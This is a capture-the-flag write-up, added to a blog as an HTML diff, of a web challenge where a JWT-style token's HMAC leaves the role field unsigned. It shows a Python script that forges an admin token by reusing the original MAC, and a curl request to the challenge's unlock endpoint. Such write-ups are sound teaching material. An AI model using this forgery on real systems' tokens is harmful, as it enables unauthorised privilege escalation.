@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="A JWT-style loyalty card whose MAC only signs handle|exp — the role field upgrade was deferred to a sprint that never happened. Forge it. snack_con S2R1 web challenge.">
+  <meta name="theme-color" content="#0a0a0f">
+  <title>Loyalty Card | Hack the Cube</title>
+
+  <meta property="og:title" content="Loyalty Card - Hack the Cube">
+  <meta property="og:description" content="MAC scope mismatch: signing covers handle|exp, role is unsigned. Free privilege escalation.">
+  <meta property="og:image" content="/blog/posts/web-loyalty-card/images/header.png">
+  <meta property="og:type" content="article">
+  <meta property="article:published_time" content="2026-05-01T00:00:00Z">
+
+  <link rel="stylesheet" href="/blog/assets/styles/blog.css">
+</head>
+<body>
+  <div class="blog-container">
+
+    <header style="padding: 1rem 0; border-bottom: 2px solid var(--border-dim); margin-bottom: 2rem;">
+      <a href="/blog/" style="display: flex; align-items: center; gap: 1rem; text-decoration: none;">
+        <span style="font-family: var(--font-pixel); font-size: 0.8rem; color: var(--terminal-green);">
+          &lt; HACK THE CUBE
+        </span>
+      </a>
+    </header>
+
+    <header class="post-header">
+      <h1 class="post-title">Loyalty Card</h1>
+
+      <div class="post-meta">
+        <div class="post-meta-item">
+          <span class="post-meta-label">Date:</span>
+          <span>May 1, 2026</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Difficulty:</span>
+          <span class="post-difficulty medium">Medium</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Category:</span>
+          <span>WEB</span>
+        </div>
+        <div class="post-meta-item solve-time">
+          <span class="post-meta-label">SOLVE TIME:</span>
+          <span class="time-value">~00:10:00</span>
+        </div>
+      </div>
+
+            <picture>
+        <source
+          type="image/webp"
+          srcset="/blog/posts/web-loyalty-card/images/header-800w.webp 800w,
+                 /blog/posts/web-loyalty-card/images/header-1200w.webp 1200w,
+                 /blog/posts/web-loyalty-card/images/header.webp 2048w"
+          sizes="(max-width: 800px) 100vw, 1200px"
+        >
+        <img
+          src="/blog/posts/web-loyalty-card/images/header.png"
+          alt="Loyalty Card - Punch card with two stamped sections and one unstamped role section being scribbled to ADMIN, Adventure Sphere holding a clipboard"
+          class="post-header-image"
+          loading="eager"
+          width="2048" height="1152"
+        >
+      </picture>
+
+      <div class="tags-container" style="justify-content: center;">
+        <a href="/blog/tags/tag.html?tag=ctf" class="tag">ctf</a>
+        <a href="/blog/tags/tag.html?tag=snack-con" class="tag">snack-con</a>
+        <a href="/blog/tags/tag.html?tag=s2r1" class="tag">s2r1</a>
+        <a href="/blog/tags/tag.html?tag=medium" class="tag">medium</a>
+        <a href="/blog/tags/tag.html?tag=web" class="tag">web</a>
+        <a href="/blog/tags/tag.html?tag=jwt" class="tag">jwt</a>
+        <a href="/blog/tags/tag.html?tag=mac-scope" class="tag">mac-scope</a>
+        <a href="/blog/tags/tag.html?tag=privilege-escalation" class="tag">privilege-escalation</a>
+        <a href="/blog/tags/tag.html?tag=glados" class="tag glados">glados</a>
+        <a href="/blog/tags/tag.html?tag=adventure-sphere" class="tag adventure-sphere">adventure-sphere</a>
+      </div>
+
+      <div class="post-characters">
+        <span class="post-meta-label">Guides:</span>
+        <span class="character-glados">GlaDOS</span>,
+        <span class="character-adventure-sphere">Adventure Sphere</span>
+      </div>
+    </header>
+
+    <main class="post-content">
+
+      <h2>The Stamp That Didn't Cover Everything</h2>
+
+      <p>The brief: <em>"A loyalty card was issued to a viewer, but the signature stamp only covers <code>handle|exp</code>. The tier-field upgrade was deferred to a sprint that never happened."</em></p>
+
+      <p>That last clause is a confession. The developer wrote a JWT-shaped token, MAC'd it covering only two fields, then ran out of time before extending the MAC to the third (the one that actually mattered for authorization). This is a real bug class &mdash; <strong>incomplete signature scope</strong> &mdash; and it's the most common "I rolled my own JWT" failure mode short of accepting <code>alg: none</code>.</p>
+
+      <div class="dialogue adventure-sphere">
+        <div class="dialogue-speaker">Adventure Sphere</div>
+        <div class="dialogue-text">"Three claims in this token, sweetheart. <em>Three</em>. The cryptographer signed two of them and went home. We're going in for the third one. Through the front door. Holding the original card."</div>
+      </div>
+
+      <h2>Reading The Decoy</h2>
+
+      <p>The challenge baked the decoy token directly into the page. Pulled from <code>/admin/</code> source:</p>
+
+      <div class="terminal-log">eyJhbGciOiJIUzI1NiIsInR5cCI6IlNOSyJ9.eyJoYW5kbGUiOiJGaXJzdE9yZ2FuaXplciIsImV4cCI6OTk5OTk5OTk5OSwicm9sZSI6InZpZXdlciJ9.WtfIpRIR0IrMDm1sf_kDhw4fI1R8W4jZnjmkfeEKwN8</div>
+
+      <p>Three dot-separated b64url segments. Decoded:</p>
+
+      <div class="terminal-log">header  = {"alg":"HS256","typ":"SNK"}     // typ=SNK is flavor; behaves like JWT
+payload = {"handle":"FirstOrganizer","exp":9999999999,"role":"viewer"}
+mac     = HMAC-SHA256(secret, "handle|exp")  // does NOT cover role</div>
+
+      <p>The on-page inspector even labels it: <em>"Signature covers: handle | exp (role is NOT covered)"</em>. The signing secret <code>S2_SIGNING_2025</code> is also openly displayed &mdash; but it's a red herring for this attack. We don't need to <em>resign</em>; we need to keep the existing MAC valid while changing a field outside its scope.</p>
+
+      <h2>The Forgery</h2>
+
+      <p>Flip <code>role</code> from <code>viewer</code> to <code>admin</code>, leave handle and exp untouched, re-encode the payload, splice the same MAC back. Single Python block:</p>
+
+      <div class="terminal-log">import base64, json, hmac, hashlib
+
+def b64url_decode(s):
+    return base64.urlsafe_b64decode((s + '=' * (-len(s) % 4)).encode())
+def b64url_encode(b):
+    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IlNOSyJ9.eyJoYW5kbGUiOiJGaXJzdE9yZ2FuaXplciIsImV4cCI6OTk5OTk5OTk5OSwicm9sZSI6InZpZXdlciJ9.WtfIpRIR0IrMDm1sf_kDhw4fI1R8W4jZnjmkfeEKwN8"
+secret = b"S2_SIGNING_2025"
+
+h_b64, p_b64, mac_b64 = token.split(".")
+payload = json.loads(b64url_decode(p_b64))
+
+# Verify scope
+covered = f"{payload['handle']}|{payload['exp']}".encode()
+expected = b64url_encode(hmac.new(secret, covered, hashlib.sha256).digest())
+assert expected == mac_b64                # confirms MAC is over handle|exp only
+
+# Forge
+payload["role"] = "admin"
+new_p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
+forged = f"{h_b64}.{new_p}.{mac_b64}"     # SAME MAC — still valid because handle|exp unchanged
+print(forged)</div>
+
+      <div class="terminal-log">eyJhbGciOiJIUzI1NiIsInR5cCI6IlNOSyJ9.eyJoYW5kbGUiOiJGaXJzdE9yZ2FuaXplciIsImV4cCI6OTk5OTk5OTk5OSwicm9sZSI6ImFkbWluIn0.WtfIpRIR0IrMDm1sf_kDhw4fI1R8W4jZnjmkfeEKwN8</div>
+
+      <p>The middle segment changed from <code>...InZpZXdlciJ9</code> (<code>"role":"viewer"</code>) to <code>...ImFkbWluIn0</code> (<code>"role":"admin"</code>). MAC unchanged. Header unchanged.</p>
+
+      <p>The client-side handler then derives <code>keyCandidate = "admin-{handle}-{exp}"</code> from the validated forged payload and POSTs it to the server &mdash; which means we can also <strong>skip the JWT roundtrip entirely</strong> by sending the derived string directly:</p>
+
+      <div class="terminal-log">$ curl -s -X POST -H "Content-Type: application/json" \
+    -H "X-Session-Id: $SID" \
+    -H "Cookie: ctf_session=$SID" \
+    -d '{"door":"loyalty_card","keyCandidate":"admin-FirstOrganizer-9999999999"}' \
+    https://snackspacecon.com/api/s2/web-hex/unlock
+{"ok": true, "flag": <span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">"The flag is a lie"</span><span class="flag-revealed">"CTF{r0l3_f0rg3d_1nt0_4dm1n}"</span></span>}</div>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"<em>Role forged into admin.</em> The flag is the verb. The MAC was a fence with a gate — and somebody forgot to put the gate in the fence. We did not pick the lock. We walked through the part where the lock <em>should have been</em>."</div>
+      </div>
+
+      <h2>What I Learned</h2>
+
+      <p><strong>MAC scope is the whole game.</strong> When you see "the signature only covers <em>X</em>" in a challenge brief, the bug class is fixed: <em>X</em> is the integrity-protected slice; everything else in the same token is forgeable. JWT-shaped tokens make this especially easy to fall into &mdash; the spec encourages thinking of <em>"the payload is signed"</em> when in reality only the bytes the implementer chose to feed into the HMAC are signed.</p>
+
+      <p><strong>The signing secret was a red herring.</strong> <code>S2_SIGNING_2025</code> sat right there on the page begging to be used. But knowing the secret only matters if you need to produce a <em>new</em> MAC. When the existing MAC's scope already covers the bytes you're not changing, you don't need to compute anything &mdash; you just preserve the ciphertext. Every published "JWT secret" challenge gets harder if you assume the secret is irrelevant; nine times out of ten you don't need it.</p>
+
+      <p><strong>Read the JS bundle for the verifier shape.</strong> The handler's last line &mdash; <code>handleUnlock('token', 'loyalty_card', `admin-${payload.handle}-${payload.exp}`)</code> &mdash; revealed that the server only ever sees the derived string, not the token. Skipping the JWT and POSTing the derived string was strictly cheaper. Reading the verifier always pays.</p>
+
+      <p>The flag: <span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">CTF{r0l3_f0rg3d_1nt0_4dm1n}</span></span></p>
+
+      <aside class="attack-path">
+        <h3>Attack Path Summary</h3>
+        <ol>
+          <li>Pull decoy token from <code>/admin/</code> HTML &mdash; <code>handle=FirstOrganizer, exp=9999999999, role=viewer</code></li>
+          <li>Read JS handler &mdash; MAC covers <code>handle|exp</code> only; server-side keyCandidate is <code>admin-{handle}-{exp}</code></li>
+          <li>Verify MAC scope locally (HMAC-SHA256 with <code>S2_SIGNING_2025</code> matches the token's MAC)</li>
+          <li>Flip <code>role</code> to <code>admin</code>, re-encode payload, splice with same MAC &mdash; produces forged token</li>
+          <li>Skip the token roundtrip: POST keyCandidate directly &rarr; flag in response</li>
+        </ol>
+      </aside>
+
+    </main>
+
+    <nav class="post-nav">
+      <a href="/blog/posts/web-pantry-poltergeist/" class="post-nav-link prev">Pantry Poltergeist</a>
+      <a href="/blog/posts/web-shift-log/" class="post-nav-link next">Shift Log</a>
+    </nav>
+
+    <footer class="blog-footer">
+      <p class="footer-text">
+        <a href="/blog/" class="footer-link">Back to Test Chamber Archives</a>
+      </p>
+      <p class="footer-text" style="font-size: 0.8rem; color: var(--text-dim);">
+        For science. You monster.
+      </p>
+    </footer>
+
+  </div>
+</body>
+</html>
